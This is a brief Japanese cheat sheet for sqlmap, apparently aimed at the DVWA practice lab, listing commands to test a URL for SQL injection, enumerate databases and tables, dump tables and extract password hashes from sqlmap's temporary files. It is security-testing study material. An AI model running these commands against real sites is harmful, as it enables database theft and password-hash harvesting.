# sqlmap

SQLインジェクションの脆弱性診断ツール

## コマンド

1. BurpSuiteでSQL操作時のリクエストを観測 GETリクエストとCookieでセッションIDを保持しているか。
2. help `sqlmap -h`
3. コマンド例 `sqlmap -u "http://URL/vulnerbilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=...; security=low"`
4. `--dump`でデータベースをダンプ可能
5. `--data`POSTで実行できる

``` shell
# help
sqlmap -h

# 脆弱性の診断 sqlmap -u "<エラーが出ないURL>"
sqlmap -u "http://URL/vulnerbilities/sqli_blind/?id=1&Submit=Submit#"
# データベース　スキーマの表示
sqlmap -u "http://URL/vulnerbilities/sqli_blind/?id=1&Submit=Submit#" --dbs
# テーブル一覧
sqlmap -u "http://URL/vulnerbilities/sqli_blind/?id=1&Submit=Submit#" -D <databasename> --tables
# テーブルダンプ
# dumpファイル ~/.local/share/sqlmap/output/<URL>/dump/webapp/<table_name>.csv
# password　hash　があった場合は一時的に cat /tmp/sqlmap*/sqlmap*.txt で確認できる。
sqlmap -u "http://URL/vulnerbilities/sqli_blind/?id=1&Submit=Submit#" -D <database_name> -T <table_name> --dump
# password hashのparse
sed -i 's/:\*/:/' /tmp/sqlmap*/sqlmap*.txt
cat /tmp/sqlmap*/sqlmap*.txt
```
